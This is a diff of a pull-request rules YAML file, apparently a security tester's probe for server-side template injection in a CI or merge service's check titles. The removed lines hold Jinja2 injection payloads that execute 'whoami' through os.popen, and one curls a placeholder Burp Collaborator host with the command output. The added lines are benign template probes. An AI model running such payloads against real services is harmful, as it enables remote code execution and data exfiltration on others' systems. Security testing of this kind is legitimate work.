@@ -1,21 +1,28 @@
 pull_request_rules:
-  - name: ssti-math
+  - name: ssti-1-self
     conditions: []
     actions:
       post_check:
-        title: "7*7={{ 7*7 }}"
+        title: "self={{ self }}"
         summary: ""
 
-  - name: ssti-rce
+  - name: ssti-2-cycler
     conditions: []
     actions:
       post_check:
-        title: "{{ lipsum.__globals__['os'].popen('whoami').read() }}"
+        title: "cycler={{ cycler }}"
         summary: ""
 
-  - name: ssti-pingback
+  - name: ssti-3-range
     conditions: []
     actions:
       post_check:
-        title: "{{ lipsum.__globals__['os'].popen('curl https://YOUR-CALLBACK.burpcollaborator.net/$(whoami)').read() }}"
+        title: "range={{ range(5)|list }}"
+        summary: ""
+
+  - name: ssti-4-dictsort
+    conditions: []
+    actions:
+      post_check:
+        title: "dictsort={{ {'b':2,'a':1}|dictsort }}"
         summary: ""
